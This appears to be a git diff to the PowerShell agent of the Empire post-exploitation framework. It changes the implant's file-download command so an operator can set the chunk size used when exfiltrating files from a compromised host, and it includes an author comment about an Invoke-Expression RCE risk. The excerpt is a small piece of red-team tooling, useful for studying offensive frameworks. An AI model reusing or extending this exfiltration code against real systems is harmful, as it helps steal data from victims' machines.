@@ -441,7 +441,7 @@ function Invoke-Empire {
         Param(
             [string] $File,
             [int] $Index = 0,
-            $ChunkSize = 512KB,
+            [int] $ChunkSize = 512KB,
             [switch] $NoBase64
         )
 
@@ -669,11 +669,34 @@ function Invoke-Empire {
             # file download
             elseif($type -eq 41){
                 try{
-                    $path = Get-Childitem $data | %{$_.FullName}
+                		$parts = $data.Split(" ")
+                		if($parts.Length -ne 1){
+                			$path = Get-Childitem $parts[0] | %{$_.FullName}
+                			# chunk size in Ko
+                			try {
+                				# Invoke-Expression = risk of RCE :-/
+                				#$ChunkSize = Invoke-Expression $parts[1];
+                				# ToInt is more secure but do not allows expression with KB, MB...
+                				$ChunkSize = [convert]::ToInt32($parts[1], 10)*1024;
+                			} catch {
+                				$ChunkSize = 512KB;
+                			}
+                			if ($ChunkSize -le 64KB){
+                				# hard coded floor limit
+                				$ChunkSize = 64KB;
+                			}	elseif ($ChunkSize -gt 8MB){
+                				# hard coded ceil limit, no real reason to limit to 8MB ;-)
+												$ChunkSize = 8MB;
+											}
+										} else {
+											$path = Get-Childitem $data | %{$_.FullName}
+											$ChunkSize = 512KB
+										}
+                		$path = Get-Childitem $parts[0] | %{$_.FullName}
                     # read in and send 512kb chunks for as long as the file has more parts
                     $Index = 0
                     do{
-                        $EncodedPart = Get-FilePart -File "$path" -Index $Index
+                        $EncodedPart = Get-FilePart -File "$path" -Index $Index -ChunkSize $ChunkSize
                         
                         if($EncodedPart){
                             $data = "{0}|{1}|{2}" -f $Index, $path, $EncodedPart
